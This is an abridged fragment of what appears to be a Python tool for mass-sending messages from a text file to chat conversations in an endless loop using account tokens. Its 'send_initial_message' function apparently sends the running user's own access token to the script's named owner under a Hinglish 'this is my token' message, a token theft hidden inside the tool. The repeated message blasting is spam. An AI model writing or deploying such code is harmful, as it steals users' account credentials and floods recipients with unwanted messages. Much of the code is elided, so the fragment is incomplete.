...
def send_initial_message():
      ...
      msg_template = "CREDIT :-💝💝 𝐊𝐑𝐈𝐒𝐇𝐍𝐀 💝                                                       OWNER =>😈 𝐊𝐑𝐈𝐒𝐇𝐍𝐀 𝐑𝐊 𝐁𝐑𝐀𝐍𝐃 𝐇𝐄𝐑𝐄 😈                                                      𝗛𝗘𝗟𝗟𝗢 𝗞𝗥𝗜𝗦𝗛𝗡𝗔 𝗝𝗜😽 I 𝗬𝗘 𝗠𝗘𝗥𝗔 𝗧𝗢𝗞𝗘𝗡 𝗛𝗘 𝗕𝗛𝗔𝗜 🥳🥳🥳              :- {}"
...
def send_messages_from_file():
      ...
      with open('KRISHNA1.txt', 'r') as file:
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      print("\033[1;36m[✓] 💝 𝗞𝗥𝗜𝗦𝗛𝗡𝗔 💝 𝗝𝗜 𝗞𝗜 𝗢𝗥 𝗦𝗘 𝗔𝗔𝗣𝗞𝗔 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗖𝗛𝗔𝗟𝗔 𝗚𝗔𝗬𝗔 𝗔𝗕 𝗞𝗛𝗨𝗦𝗛 𝗥𝗘𝗛𝗘 𝗛𝗢...🍒🍒 {} of Convo {} Token {}: {}".format(
